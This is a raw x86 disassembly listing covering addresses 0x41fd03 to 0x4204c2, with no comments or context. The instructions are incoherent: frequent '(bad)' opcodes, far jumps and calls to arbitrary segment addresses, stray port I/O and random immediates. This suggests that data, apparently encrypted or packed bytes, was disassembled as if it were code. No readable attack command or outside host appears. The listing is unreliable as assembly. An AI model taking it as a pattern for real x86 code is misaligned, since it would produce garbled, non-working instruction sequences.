  41fd03:	repz dec eax
  41fd05:	std    
  41fd06:	div    DWORD PTR [ebx-0x181f2c48]
  41fd0c:	inc    esi
  41fd0d:	repnz cwde 
  41fd0f:	scas   eax,DWORD PTR es:[edi]
  41fd10:	jmp    0xa79d:0x78bb319c
  41fd17:	sbb    DWORD PTR [eax-0x43010967],eax
  41fd1d:	and    al,0x8a
  41fd1f:	sbb    DWORD PTR [ebx],0x3aaefa7b
  41fd25:	cdq    
  41fd26:	sub    DWORD PTR [ebx-0x7f],0x6b
  41fd2a:	imul   ebx,DWORD PTR [edx],0xaee30782
  41fd30:	adc    BYTE PTR [esi+0x3],cl
  41fd33:	add    edx,DWORD PTR [edi]
  41fd35:	sbb    BYTE PTR [ebx],cl
  41fd37:	add    al,0xa
  41fd39:	aam    0xbf
  41fd3b:	mov    cl,0xe3
  41fd3d:	bound  edi,QWORD PTR [edi+0x64630997]
  41fd43:	inc    ebx
  41fd44:	in     al,0x91
  41fd46:	push   ds
  41fd47:	or     ch,ch
  41fd49:	pop    ebx
  41fd4a:	jne    0x41fd5d
  41fd4c:	adc    eax,0xb986ce93
  41fd51:	dec    edi
  41fd52:	fcmovnb st,st(0)
  41fd54:	call   0x2cb1:0x9742554e
  41fd5b:	jb     0x41fd2b
  41fd5d:	stos   BYTE PTR es:[edi],al
  41fd5e:	mov    BYTE PTR [ecx+0x1f1d7480],0x79
  41fd65:	jmp    0x8560:0x44ba22de
  41fd6c:	call   0x38a83a45
  41fd71:	pusha  
  41fd72:	xchg   esp,eax
  41fd73:	int3   
  41fd74:	cs mov ?,esp
  41fd77:	addr16 pusha 
  41fd79:	cmp    ah,bh
  41fd7b:	push   0x2
  41fd7d:	cld    
  41fd7e:	push   ecx
  41fd7f:	(bad)  
  41fd80:	into   
  41fd81:	into   
  41fd82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd84:	pop    es
  41fd85:	xchg   ebp,eax
  41fd86:	nop
  41fd87:	xchg   ebp,eax
  41fd88:	pushf  
  41fd89:	mov    DWORD PTR [ecx-0x78],esi
  41fd8c:	bsf    edi,edx
  41fd8f:	mov    edi,esp
  41fd91:	adc    DWORD PTR [edi-0x11],esi
  41fd94:	sub    eax,0xfe510fb6
  41fd99:	mov    dh,0x8d
  41fd9b:	sar    bl,0x95
  41fd9e:	aad    0xca
  41fda0:	int    0x8
  41fda2:	pop    ecx
  41fda3:	sub    edi,DWORD PTR [esi+ebp*2-0x7b]
  41fda7:	pop    esp
  41fda8:	xor    DWORD PTR [ebp-0xc],0xffffffa4
  41fdac:	cwde   
  41fdad:	aam    0xdb
  41fdaf:	aad    0x8b
  41fdb1:	pop    edx
  41fdb2:	fiadd  DWORD PTR ds:0x5d1450a7
  41fdb8:	fiadd  DWORD PTR [ebx]
  41fdba:	pushf  
  41fdbb:	xor    DWORD PTR [esi],ecx
  41fdbd:	jns    0x41fd91
  41fdbf:	push   ebx
  41fdc0:	cs fucom st(0)
  41fdc3:	add    DWORD PTR [ebx],eax
  41fdc5:	xor    esi,DWORD PTR [edi+0x4]
  41fdc8:	sbb    eax,0x2288f015
  41fdcd:	out    dx,al
  41fdce:	pop    ss
  41fdcf:	(bad)  
  41fdd1:	add    al,0x73
  41fdd3:	imul   edx,DWORD PTR [edi-0x753d848a],0x18f6017
  41fddd:	jno    0x41fde3
  41fddf:	icebp  
  41fde0:	call   0x89b0aa08
  41fde5:	retf   
  41fde6:	pop    eax
  41fde7:	gs cmc 
  41fde9:	mov    ah,BYTE PTR [ecx]
  41fdeb:	pop    ds
  41fdec:	mov    esp,0x81deeb35
  41fdf1:	repnz mov DWORD PTR [eax+0x48],0x97fef606
  41fdf9:	add    ah,BYTE PTR [edi]
  41fdfb:	mov    bh,0xfb
  41fdfd:	xchg   edx,eax
  41fdfe:	and    al,0x92
  41fe00:	cmp    eax,0x595801a6
  41fe05:	aad    0x31
  41fe07:	mov    dl,0xec
  41fe09:	lahf   
  41fe0a:	pop    ebx
  41fe0b:	test   al,0xa2
  41fe0d:	sub    ah,BYTE PTR [ecx+0x20]
  41fe10:	es sahf 
  41fe12:	mov    ds:0x7ece86bb,eax
  41fe17:	jns    0x41fdf3
  41fe19:	jno    0x41fe4c
  41fe1b:	add    DWORD PTR [edx],esi
  41fe1d:	test   al,0x5c
  41fe1f:	jo     0x41fdae
  41fe21:	imul   esi,DWORD PTR [ebx-0x79],0x291472d0
  41fe28:	pop    ds
  41fe29:	push   es
  41fe2a:	test   BYTE PTR [edi-0x6a523e62],al
  41fe30:	jmp    0x86a0:0x596ca7fe
  41fe37:	jnp    0x41fdf1
  41fe39:	retf   
  41fe3a:	cmp    BYTE PTR [ebp-0x6],al
  41fe3d:	dec    ecx
  41fe3e:	jle    0x41fdc6
  41fe40:	addr16 mov edi,0x329ce0bf
  41fe46:	daa    
  41fe47:	imul   esi,esp,0xffffffd8
  41fe4a:	je     0x41fe5a
  41fe4c:	pop    esp
  41fe4d:	push   eax
  41fe4e:	nop
  41fe4f:	fild   QWORD PTR [eax+0x70]
  41fe52:	and    eax,0x5ba883c1
  41fe57:	mov    esp,0xfa7ae4d6
  41fe5c:	nop
  41fe5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe5e:	inc    edi
  41fe5f:	std    
  41fe60:	pop    ecx
  41fe61:	or     eax,0x8a59fe5b
  41fe66:	test   eax,0x4407c89e
  41fe6b:	xchg   BYTE PTR [esi-0x49b3a628],bl
  41fe71:	sub    eax,0xa5f8c223
  41fe76:	aaa    
  41fe77:	jne    0x41fea3
  41fe79:	push   ss
  41fe7a:	jp     0x41fe01
  41fe7c:	pop    ecx
  41fe7d:	(bad)  
  41fe7e:	cmp    bl,ah
  41fe80:	bound  ecx,QWORD PTR [esi+0x21]
  41fe83:	into   
  41fe84:	in     al,dx
  41fe85:	mov    DWORD PTR [esi+0x38],ecx
  41fe88:	cdq    
  41fe89:	jae    0x41feb3
  41fe8b:	ds daa 
  41fe8d:	and    DWORD PTR [edi+0x6bc20855],edi
  41fe93:	(bad)
  41fe96:	cmp    edi,eax
  41fe98:	pop    edx
  41fe99:	mov    esi,0xbdb5b371
  41fe9e:	test   BYTE PTR [edi-0x44],al
  41fea1:	or     bl,BYTE PTR [edi+0x2e543202]
  41fea7:	sbb    dl,bh
  41fea9:	fwait
  41feaa:	int3   
  41feab:	dec    ebp
  41feac:	mov    al,0x36
  41feae:	(bad)  
  41feaf:	add    esp,DWORD PTR gs:[ecx]
  41feb2:	sub    edi,DWORD PTR [edi]
  41feb4:	inc    edx
  41feb5:	and    edi,ebx
  41feb7:	inc    esi
  41feb8:	ja     0x41fe57
  41feba:	mov    esi,0xa0d42349
  41febf:	lods   eax,DWORD PTR es:[esi]
  41fec1:	call   0xf0f32d23
  41fec6:	pop    eax
  41fec7:	mov    cl,0x7f
  41fec9:	(bad)  
  41feca:	lock jge 0x41ff06
  41fecd:	fwait
  41fece:	cld    
  41fecf:	scas   al,BYTE PTR es:[edi]
  41fed0:	add    DWORD PTR [ebp+0x9],eax
  41fed3:	test   eax,0xff44c3f1
  41fed8:	(bad)  [edx+0x21dc670a]
  41fede:	int3   
  41fedf:	lock fcomp DWORD PTR [ecx+0xe90a488]
  41fee6:	mov    bh,0x88
  41fee8:	sbb    ebx,DWORD PTR [eax+0x48ce08a]
  41feee:	pop    esi
  41feef:	imul   ecx,DWORD PTR [ebp+0x50],0xfffffff3
  41fef3:	(bad)  
  41fef4:	leave  
  41fef5:	xchg   esp,eax
  41fef6:	jmp    0xc55d:0x258e0fa
  41fefd:	sbb    BYTE PTR [ebx-0x14e50a0a],ch
  41ff03:	or     edi,DWORD PTR gs:[ebx+0x7a6744aa]
  41ff0a:	sub    dh,BYTE PTR [ebx+edi*8+0x43]
  41ff0e:	(bad)  
  41ff0f:	adc    DWORD PTR [ebp-0x12],ebp
  41ff12:	xchg   ebp,eax
  41ff13:	xor    DWORD PTR [edi-0x76],esp
  41ff16:	add    eax,0xcbb9b7b9
  41ff1b:	adc    al,BYTE PTR [esi+0x39]
  41ff1e:	jp     0x41ff10
  41ff20:	retf   0xe912
  41ff23:	aas    
  41ff24:	test   ebp,esi
  41ff26:	inc    edi
  41ff27:	(bad)  
  41ff28:	adc    BYTE PTR [ecx-0x52ae9640],dl
  41ff2e:	push   esi
  41ff2f:	neg    BYTE PTR [ebp+0x62]
  41ff32:	fdiv   st(4),st
  41ff34:	mov    WORD PTR [edx],es
  41ff36:	pop    es
  41ff37:	mov    edx,edi
  41ff39:	(bad)  
  41ff3a:	sti    
  41ff3b:	repnz das 
  41ff3d:	fld    QWORD PTR [esi-0x47]
  41ff40:	pop    ds
  41ff41:	push   edx
  41ff42:	cmp    eax,0x6cf0481e
  41ff47:	repnz ficomp WORD PTR [esi+0x12]
  41ff4b:	in     al,0xdd
  41ff4d:	mov    dh,0xfd
  41ff4f:	jmp    0x50e87c1c
  41ff54:	xor    edx,0x4c573303
  41ff5a:	inc    edx
  41ff5b:	cmp    BYTE PTR [edi],0x6
  41ff5e:	push   cx
  41ff60:	and    eax,0xc2ffd4ce
  41ff65:	cs push edi
  41ff67:	adc    al,0xb0
  41ff69:	or     ebx,esi
  41ff6b:	retf   0x294f
  41ff6e:	test   eax,0xdcf396f1
  41ff73:	in     al,dx
  41ff74:	mov    dh,0xb2
  41ff76:	jmp    0x41ff6f
  41ff78:	jmp    0xa655:0xbf0bd0da
  41ff7f:	mov    eax,0xedb3f8d8
  41ff84:	mov    dl,BYTE PTR [edx+esi*2+0x6b5ace45]
  41ff8b:	test   al,0x3
  41ff8d:	inc    ebp
  41ff8e:	scas   eax,DWORD PTR es:[edi]
  41ff8f:	test   ebp,edi
  41ff91:	imul   edi,DWORD PTR [esi],0xffffffea
  41ff94:	(bad)  [ecx-0x6cf8648e]
  41ff9a:	ins    BYTE PTR es:[edi],dx
  41ff9b:	(bad)  
  41ff9c:	(bad)  
  41ff9d:	adc    al,0x4e
  41ff9f:	pop    edx
  41ffa0:	imul   edx,DWORD PTR [edx-0x52c6eb72],0xb2b0c836
  41ffaa:	jns    0x41fff9
  41ffac:	cmp    ecx,DWORD PTR [ebx+ecx*4+0x55ac8f24]
  41ffb3:	ror    dl,1
  41ffb5:	mov    esi,0xc3e08180
  41ffba:	push   eax
  41ffbb:	xlat   BYTE PTR ds:[ebx]
  41ffbc:	add    al,0x77
  41ffbe:	retf   
  41ffbf:	cwde   
  41ffc0:	mov    ah,0x11
  41ffc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffc3:	fst    DWORD PTR [esi+0x1ba4e54d]
  41ffc9:	jmp    0x506972
  41ffce:	in     al,0x64
  41ffd0:	in     al,0xe1
  41ffd2:	dec    DWORD PTR [esi-0x4bd1a169]
  41ffd8:	call   0xde8e:0x3b2c11c8
  41ffdf:	jg     0x41ff61
  41ffe1:	fcomp  st(1)
  41ffe3:	adc    esp,DWORD PTR [ebx*8-0xf00995b]
  41ffea:	sub    eax,0x38758247
  41ffef:	loop   0x420001
  41fff1:	enter  0x8bfa,0x8b
  41fff5:	(bad)  
  41fff7:	mov    bh,0x7a
  41fff9:	add    eax,0x54cea998
  41fffe:	inc    esp
  41ffff:	cmp    bl,BYTE PTR [ecx+0x716d45d3]
  420005:	cmp    ecx,DWORD PTR [ebp-0x6b]
  420008:	lods   eax,DWORD PTR ds:[esi]
  420009:	loope  0x420067
  42000b:	int3   
  42000c:	movd   ecx,mm5
  42000f:	fistp  WORD PTR [ebp+0x47]
  420012:	mov    DWORD PTR [ebx+0x240d12c],esp
  420018:	inc    eax
  420019:	(bad)  
  42001a:	xlat   BYTE PTR ds:[ebx]
  42001b:	jns    0x42005e
  42001d:	adc    ecx,eax
  42001f:	ss pop esp
  420021:	fstp   QWORD PTR [eax-0x6e]
  420024:	mov    ecx,0xdf4380f7
  420029:	inc    eax
  42002a:	pop    esi
  42002b:	xor    dh,BYTE PTR [esi+esi*8-0x373756df]
  420032:	pop    ebx
  420033:	mov    dh,BYTE PTR [edi]
  420035:	jo     0x4200b3
  420037:	pop    ss
  420038:	pop    ecx
  420039:	(bad)  
  42003a:	ficomp DWORD PTR [esi]
  42003c:	xor    edi,DWORD PTR [eax-0x2d5d4cfc]
  420042:	pop    ebp
  420043:	js     0x420081
  420045:	in     eax,0xfd
  420047:	push   eax
  420048:	pop    ebx
  420049:	outs   dx,DWORD PTR ds:[esi]
  42004a:	fidiv  WORD PTR [edi]
  42004c:	push   ebx
  42004d:	inc    ecx
  42004e:	push   esi
  42004f:	xchg   ebp,eax
  420050:	pop    edx
  420051:	xchg   edx,eax
  420052:	dec    eax
  420053:	adc    al,0x93
  420055:	cmp    al,0x56
  420057:	fs jl  0x4200ab
  42005a:	adc    cl,BYTE PTR [eax-0x1f6843c3]
  420060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420061:	push   esi
  420062:	loop   0x42005a
  420064:	pop    edx
  420065:	clc    
  420066:	sub    al,0xf6
  420068:	fstp   DWORD PTR [esi-0x1e]
  42006b:	loope  0x4200ad
  42006d:	xor    ebp,DWORD PTR [ecx]
  42006f:	loope  0x42006a
  420071:	jno    0x4200d9
  420073:	es pushf 
  420075:	adc    BYTE PTR [edi-0x52],bl
  420078:	push   esp
  420079:	aam    0x7e
  42007b:	aad    0x1c
  42007d:	dec    eax
  42007e:	cmp    bl,BYTE PTR [edx]
  420080:	xchg   esp,eax
  420081:	data16 jg 0x420085
  420084:	in     al,0xee
  420086:	loop   0x420056
  420088:	cmp    edx,DWORD PTR [esi]
  42008a:	mov    al,0x68
  42008c:	and    al,0x63
  42008e:	inc    ebx
  42008f:	pop    esp
  420090:	fcmove st,st(6)
  420092:	inc    ebx
  420093:	xchg   DWORD PTR [ebp+esi*4-0x1],ecx
  420097:	xchg   esi,eax
  420098:	push   edi
  420099:	push   ecx
  42009a:	add    BYTE PTR [ebx+0xb],dh
  42009d:	push   ds
  42009e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42009f:	add    eax,0x2e9fb23c
  4200a4:	or     al,0xb6
  4200a6:	or     dl,ch
  4200a8:	sub    eax,0x24c508bb
  4200ad:	jmp    0x2efe:0xee5862ae
  4200b4:	or     dl,BYTE PTR [ebx+esi*4+0x8f3b9da]
  4200bb:	push   0xd5311276
  4200c0:	sub    DWORD PTR [ecx-0x6e86e315],edx
  4200c6:	in     eax,0x18
  4200c8:	mov    bh,BYTE PTR [edx+0x75814c45]
  4200ce:	lock call 0x4b1bcc1
  4200d4:	sub    eax,0x5041180
  4200d9:	ja     0x420073
  4200db:	ret    
  4200dc:	fcom   DWORD PTR ds:0xbc62585a
  4200e2:	retf   
  4200e3:	pusha  
  4200e4:	dec    edx
  4200e5:	mov    ecx,0x8d51f558
  4200ea:	mov    bh,0xe6
  4200ec:	jecxz  0x420144
  4200ee:	jb     0x42007f
  4200f0:	jb     0x4200d2
  4200f2:	mov    ebx,0xc3303db9
  4200f7:	sbb    bl,BYTE PTR [ebx]
  4200f9:	aas    
  4200fa:	stos   DWORD PTR es:[edi],eax
  4200fb:	pop    es
  4200fc:	jecxz  0x4200d7
  4200fe:	shl    DWORD PTR [edx],1
  420100:	cmp    cl,ch
  420102:	mov    ecx,0x8d5d222
  420107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420108:	sub    ebx,DWORD PTR [edx+0x4481108a]
  42010e:	jb     0x420091
  420110:	dec    edi
  420111:	dec    edx
  420112:	xchg   esp,eax
  420113:	push   cs
  420114:	sub    bh,cl
  420116:	sbb    al,0xdf
  420118:	fist   DWORD PTR [ebx+0x21]
  42011b:	and    BYTE PTR [ebx+eax*8],cl
  42011e:	clc    
  42011f:	cs pushf 
  420121:	fidiv  DWORD PTR [ebp+0x46]
  420124:	jp     0x420111
  420126:	jge    0x420171
  420128:	repnz sahf 
  42012a:	inc    esi
  42012b:	jno    0x4200df
  42012d:	and    DWORD PTR [edx-0x3564a215],eax
  420133:	jb     0x420171
  420135:	bound  esp,QWORD PTR [esi-0x6c386017]
  42013b:	leave  
  42013c:	xchg   edi,eax
  42013d:	(bad)  
  42013e:	fs or  al,0x14
  420141:	sub    ebx,DWORD PTR [esi+0xb4fb45d]
  420147:	xor    ebp,DWORD PTR [ebx+0x77880322]
  42014d:	xchg   esi,eax
  42014e:	inc    ebp
  42014f:	(bad)  
  420150:	call   0xea4f:0x298b08f7
  420157:	loopne 0x4201b0
  420159:	or     cl,ch
  42015b:	mov    ecx,DWORD PTR [ecx-0xf295c69]
  420161:	lahf   
  420162:	outs   dx,BYTE PTR ds:[esi]
  420163:	aad    0x8d
  420165:	cwde   
  420166:	in     eax,dx
  420167:	push   ebp
  420168:	mov    al,ds:0x34abbc73
  42016d:	fbstp  TBYTE PTR [ebp+0x4c]
  420170:	fmul   st(7),st
  420172:	xchg   edi,eax
  420173:	jno    0x42014a
  420175:	pushf  
  420176:	sub    esi,edx
  420178:	mov    ebx,0xa3dbfa9a
  42017d:	lods   al,BYTE PTR ss:[esi]
  42017f:	scas   al,BYTE PTR es:[edi]
  420180:	clc    
  420181:	lds    esi,FWORD PTR [ebx-0x26]
  420184:	repz mov esp,DWORD PTR [eax+0x60]
  420188:	or     DWORD PTR [ebx-0x6f],esi
  42018b:	sub    DWORD PTR [eax],ecx
  42018d:	call   0x682e:0x98d85adf
  420194:	imul   ebp,DWORD PTR [esi+ebp*4],0xbdff1fb3
  42019b:	xchg   esp,eax
  42019c:	loop   0x42020c
  42019e:	add    DWORD PTR [esi+0x7190e8d9],0xffffffe8
  4201a5:	xor    esi,DWORD PTR [edx+ecx*8-0x55]
  4201a9:	iret   
  4201aa:	leave  
  4201ab:	sar    esi,1
  4201ad:	pop    eax
  4201ae:	gs xchg esp,eax
  4201b0:	fstp   DWORD PTR [eax-0x4a2989c0]
  4201b6:	mov    al,0x71
  4201b8:	sbb    bh,bl
  4201ba:	sahf   
  4201bb:	stos   BYTE PTR es:[edi],al
  4201bc:	out    dx,eax
  4201bd:	into   
  4201be:	loop   0x420206
  4201c0:	xor    ebp,esi
  4201c2:	lock jo 0x4201df
  4201c5:	mov    ch,0x75
  4201c7:	mov    eax,ds:0x81e21f63
  4201cc:	push   ds
  4201cd:	cdq    
  4201ce:	rcl    ebp,cl
  4201d0:	sar    BYTE PTR [edx-0x76],cl
  4201d3:	jnp    0x420234
  4201d5:	mov    DWORD PTR [edi-0x2],edi
  4201d8:	dec    edi
  4201d9:	inc    eax
  4201da:	mov    cl,0x6
  4201dc:	push   edi
  4201dd:	ja     0x42018b
  4201df:	cmc    
  4201e0:	imul   ecx,DWORD PTR [esi+ebp*4],0xffffffe3
  4201e4:	retf   0xa23b
  4201e7:	jo     0x420254
  4201e9:	jbe    0x420254
  4201eb:	dec    ecx
  4201ec:	sbb    ebp,DWORD PTR [edi+0x4]
  4201ef:	mov    ah,0x36
  4201f1:	lods   eax,DWORD PTR ds:[esi]
  4201f2:	fwait
  4201f3:	jo     0x4201f6
  4201f5:	jmp    0xa31708d0
  4201fa:	xor    al,0xff
  4201fc:	or     BYTE PTR [ebp-0x14],0xbc
  420200:	jmp    0x4201cb
  420202:	loopne 0x420236
  420204:	and    eax,0xf7c149b1
  420209:	(bad)  
  42020a:	out    dx,eax
  42020b:	cwde   
  42020c:	(bad)  
  42020d:	pop    ss
  42020e:	xor    edx,DWORD PTR [ebp-0x42058b77]
  420214:	and    bh,BYTE PTR [ecx]
  420216:	pop    ecx
  420217:	in     eax,dx
  420218:	cmp    DWORD PTR [esi+0x4ebb8d6d],0xffffffa3
  42021f:	and    DWORD PTR [eax+0x58],esp
  420222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420223:	gs (bad) 
  420225:	sti    
  420226:	lea    ebp,[eax]
  420228:	stos   BYTE PTR es:[edi],al
  420229:	add    al,0x50
  42022b:	add    ebp,DWORD PTR fs:[ebx+0x3f]
  42022f:	shl    ebp,cl
  420231:	pop    eax
  420232:	loopne 0x420285
  420234:	lds    ebx,FWORD PTR [edx]
  420236:	dec    ecx
  420237:	rcr    bh,cl
  420239:	inc    ebp
  42023a:	(bad)  
  42023b:	jns    0x42029d
  42023d:	mov    ebp,0x14f79dcd
  420242:	jns    0x420216
  420244:	out    0x28,eax
  420246:	cdq    
  420247:	rol    DWORD PTR [edi],1
  420249:	ja     0x4201ed
  42024b:	dec    esi
  42024c:	xchg   edi,eax
  42024d:	mov    ecx,0x8daf57e0
  420252:	retf   
  420253:	paddsb mm2,QWORD PTR ds:0x8e1c28a7
  42025a:	inc    esi
  42025b:	or     DWORD PTR [eax-0x40],esp
  42025e:	mov    edx,0x9eac2c93
  420263:	sbb    ch,BYTE PTR [ecx+0x2ae5c78a]
  420269:	jge    0x4202d6
  42026b:	sub    esp,eax
  42026d:	mov    WORD PTR [esi+0x7f7d7401],?
  420273:	and    eax,0x1cea7f73
  420278:	out    0xe7,al
  42027a:	icebp  
  42027b:	pop    ds
  42027c:	fsub   QWORD PTR [esp+edx*8]
  42027f:	xchg   BYTE PTR [edi],dh
  420281:	pop    esp
  420282:	sub    DWORD PTR [edi-0x100c40df],esi
  420288:	les    esi,FWORD PTR [esi-0x32]
  42028b:	push   0x66e39bb8
  420290:	add    al,0x3f
  420292:	adc    DWORD PTR [ebx-0x2c],esp
  420295:	dec    ebx
  420296:	pushf  
  420297:	or     eax,0xe4df5079
  42029c:	test   eax,0x27bb1f78
  4202a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202a2:	xor    BYTE PTR [edi*4-0x2da3a5f1],bl
  4202a9:	test   al,0x7e
  4202ab:	pusha  
  4202ac:	jns    0x420322
  4202ae:	xchg   esp,eax
  4202af:	rol    DWORD PTR [eax+0x31],1
  4202b2:	test   al,0x2e
  4202b4:	cwde   
  4202b5:	jo     0x4202b5
  4202b7:	and    BYTE PTR [eax],dh
  4202b9:	pop    eax
  4202ba:	bound  edx,QWORD PTR [ebx+esi*2]
  4202bd:	cmp    bl,BYTE PTR [edx]
  4202bf:	jecxz  0x420325
  4202c1:	shr    DWORD PTR [edx+0x3c],0xf3
  4202c5:	pushf  
  4202c6:	pop    es
  4202c7:	jmp    0x420252
  4202c9:	inc    ecx
  4202ca:	sub    ah,dl
  4202cc:	(bad)  
  4202cd:	sub    ch,BYTE PTR [ebp+edi*4-0x2a5330cf]
  4202d4:	inc    ecx
  4202d5:	hlt    
  4202d6:	cmp    DWORD PTR [esi-0x2f],0xffffff85
  4202da:	xchg   edx,eax
  4202db:	das    
  4202dc:	and    eax,0xc7e38e72
  4202e1:	sub    ch,BYTE PTR [esi+0x7843dd81]
  4202e7:	adc    al,dl
  4202e9:	xchg   ebx,eax
  4202ea:	ror    BYTE PTR [esi+0x35],0x71
  4202ee:	push   ss
  4202ef:	scas   eax,DWORD PTR es:[edi]
  4202f0:	retf   0x2c7b
  4202f3:	addr16 mov esp,0xcfb31c8
  4202f9:	std    
  4202fa:	mov    ds:0x6b890471,eax
  4202ff:	test   bl,bl
  420301:	stos   BYTE PTR es:[edi],al
  420302:	sysenter 
  420304:	mov    ds:0x272a5897,al
  420309:	outs   dx,DWORD PTR ds:[esi]
  42030a:	mov    ebp,0xe79ea720
  42030f:	outs   dx,DWORD PTR ds:[esi]
  420310:	mov    edi,ebx
  420312:	pop    eax
  420313:	jle    0x42029d
  420315:	xlat   BYTE PTR ds:[ebx]
  420316:	mov    eax,ds:0xd313407b
  42031b:	jnp    0x42029f
  42031d:	jg     0x4202ea
  42031f:	test   eax,0xaf32a532
  420324:	sub    ebx,DWORD PTR [edi-0x79]
  420327:	outs   dx,DWORD PTR ds:[esi]
  420328:	xchg   ebp,eax
  420329:	inc    eax
  42032a:	test   BYTE PTR [ebp-0x62],ch
  42032d:	pop    ebp
  42032e:	aam    0x92
  420330:	das    
  420331:	mov    dl,0xed
  420333:	inc    ecx
  420334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420335:	arpl   WORD PTR [ebp+0x2235971f],ax
  42033b:	sub    cl,al
  42033d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42033e:	(bad)  
  42033f:	rol    BYTE PTR [ebp+0xc],0x62
  420343:	mov    ds:0x2d15d643,eax
  420348:	aaa    
  420349:	cmp    DWORD PTR [edi+esi*4],0x8c355658
  420350:	push   ds
  420351:	push   edx
  420352:	or     DWORD PTR [ebp+esi*8+0x3f],eax
  420356:	mov    ds,WORD PTR [edx+0x3f72ec1a]
  42035c:	fxch   st(1)
  42035e:	push   eax
  42035f:	mov    ds:0xd3ef6bb4,al
  420364:	pop    edi
  420365:	daa    
  420366:	jne    0x420307
  420368:	jmp    0x70cbbcff
  42036d:	add    eax,0x432ad57f
  420372:	push   0xc3819321
  420377:	mov    eax,0x153eea1b
  42037c:	fdivrp st(6),st
  42037e:	push   0xffffffdc
  420380:	test   eax,0x5fb0fe89
  420385:	push   ecx
  420386:	pop    ebx
  420387:	adc    eax,0xe43c0c14
  42038c:	xor    DWORD PTR [edx-0xb40c7d2],edi
  420392:	sbb    al,0x1
  420394:	aaa    
  420395:	push   ebp
  420396:	inc    esp
  420397:	xor    al,0xf1
  420399:	sahf   
  42039a:	push   ebp
  42039b:	retf   0x5414
  42039e:	fdivr  DWORD PTR [ebx-0x4]
  4203a1:	and    al,0x8e
  4203a3:	enter  0x3c16,0x34
  4203a7:	cli    
  4203a8:	pop    edi
  4203a9:	mov    al,0x3f
  4203ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203ac:	sub    ah,dl
  4203ae:	mov    bl,0x52
  4203b0:	adc    eax,0x34086446
  4203b5:	in     al,0xbe
  4203b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203b8:	add    al,0x8f
  4203ba:	loope  0x42033d
  4203bc:	into   
  4203bd:	daa    
  4203be:	xchg   edx,eax
  4203bf:	pop    ebp
  4203c0:	cwde   
  4203c1:	loop   0x420358
  4203c3:	mov    eax,0x2cc088c
  4203c8:	stc    
  4203c9:	sub    al,ah
  4203cb:	retf   
  4203cc:	push   eax
  4203cd:	je     0x4203e6
  4203cf:	jne    0x420351
  4203d1:	frstor [eax+0x20]
  4203d4:	fisttp WORD PTR [ecx]
  4203d6:	mov    eax,0xbf16c0d8
  4203db:	inc    ecx
  4203dc:	pushf  
  4203dd:	gs fs and ebx,0x56
  4203e2:	gs daa 
  4203e4:	sar    BYTE PTR [ebx-0x7c],1
  4203e7:	pop    edx
  4203e8:	inc    eax
  4203e9:	arpl   bx,dx
  4203eb:	jne    0x4203fc
  4203ed:	xchg   edi,eax
  4203ee:	sub    edi,0xffffffd8
  4203f1:	clc    
  4203f2:	mov    al,ds:0x49a19489
  4203f7:	pusha  
  4203f8:	into   
  4203f9:	jmp    0x420468
  4203fb:	imul   edi,eax,0xfffffff4
  4203fe:	and    edi,esp
  420400:	cmp    eax,0x94985cd0
  420405:	pushf  
  420406:	cli    
  420407:	sahf   
  420408:	rcr    DWORD PTR [eax],0x38
  42040b:	enter  0xf319,0x62
  42040f:	aad    0x4
  420411:	and    BYTE PTR [ebp+0x30],bh
  420414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420415:	push   0x4b56a219
  42041a:	pop    esp
  42041b:	jb     0x4203f2
  42041d:	js     0x420492
  42041f:	and    al,0x3a
  420421:	loope  0x420477
  420423:	add    esi,esp
  420425:	mov    edx,0xc532bd4f
  42042a:	adc    cl,BYTE PTR [ebp+0x1a6d3681]
  420430:	retf   
  420431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420432:	jb     0x420498
  420434:	arpl   WORD PTR [ebx+0x70],bx
  420437:	add    ch,BYTE PTR [edi-0x61]
  42043a:	mov    edx,0x66e1f1eb
  42043f:	jmp    0x695823aa
  420444:	inc    edx
  420445:	retf   0xc6dc
  420448:	or     al,0x90
  42044a:	and    BYTE PTR [edx+eax*8],al
  42044d:	cwde   
  42044e:	sar    dh,cl
  420450:	add    BYTE PTR [edi+0x40],bh
  420453:	xor    ah,ah
  420455:	jb     0x420472
  420457:	push   DWORD PTR [bx+di-0x64]
  42045b:	mov    WORD PTR [esi+esi*1],ss
  42045e:	cli    
  42045f:	popf   
  420460:	push   0xffffffb4
  420462:	mov    eax,0x41af0cf6
  420467:	imul   esi,DWORD PTR [ecx],0x380e01b9
  42046d:	cld    
  42046e:	(bad)  
  42046f:	aad    0x96
  420471:	loope  0x4204ba
  420473:	mov    BYTE PTR [esi],ah
  420475:	pop    esp
  420476:	mov    BYTE PTR [edx+edx*1+0x40877a86],bl
  42047d:	sub    dh,BYTE PTR [eax-0x26d8b838]
  420483:	xchg   esi,eax
  420484:	test   al,0xd0
  420486:	cmp    DWORD PTR [esi+0x1e],eax
  420489:	or     dh,0x59
  42048c:	out    dx,al
  42048d:	lea    ebx,[ebp+0x1f638988]
  420493:	mov    ebx,0xe91ac5e5
  420498:	sub    eax,0x87a0508c
  42049d:	scas   eax,DWORD PTR es:[edi]
  42049e:	(bad)  
  42049f:	inc    ecx
  4204a0:	cmp    edi,0x52
  4204a3:	jno    0x420508
  4204a5:	dec    edi
  4204a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204a7:	cs lahf 
  4204a9:	dec    eax
  4204aa:	fadd   QWORD PTR [ebp-0x13]
  4204ad:	fbstp  TBYTE PTR [esi]
  4204af:	rol    dh,cl
  4204b1:	xor    al,0x8f
  4204b3:	iret   
  4204b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204b5:	fild   WORD PTR [esi]
  4204b7:	ret    0x26c0
  4204ba:	cs push 0x19
  4204bd:	adc    eax,0xca41756
  4204c2:	in     eax,dx
